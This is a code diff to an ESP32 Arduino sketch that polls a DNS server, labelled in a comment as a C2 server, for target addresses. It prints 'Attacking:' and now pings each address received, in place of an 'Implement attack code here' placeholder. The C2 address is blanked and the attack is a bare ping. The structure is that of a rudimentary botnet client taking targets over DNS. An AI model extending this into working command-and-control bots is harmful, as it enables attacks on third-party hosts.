@@ -1,3 +1,5 @@
+#include <ESP32Ping.h>
+#include <ping.h>
 #include <WiFi.h>
 #include <WiFiUdp.h>
 #include "dns.h"
@@ -7,8 +9,8 @@ const char* ssid = "";
 const char* password = "";
 
 // DNS server to query.
-const IPAddress dnsServer(192, 168, 1, 145); // The C2 Server
-const uint16_t dnsPort = 53;
+const IPAddress dnsServer(0, 0, 0, 0); // The C2 Server
+const uint16_t dnsPort = 53533;
 
 
 // UDP instance for sending and receiving data.
@@ -38,7 +40,8 @@ void setup() {
 }
 
 void loop() {
-
+  // IPAddress ip (192,168,1,145); // The remote ip to ping
+  //     bool ret = Ping.ping(ip, 10000);
 // Domain to query.
   const char* domain = "example.com";
 
@@ -59,7 +62,7 @@ void loop() {
       Serial.print("Attacking: ");
       Serial.println(a);
       // Implement attack code here.....
-
+      bool ret = Ping.ping(a, 10);
 
     }else{
       Serial.println("Awaiting command");
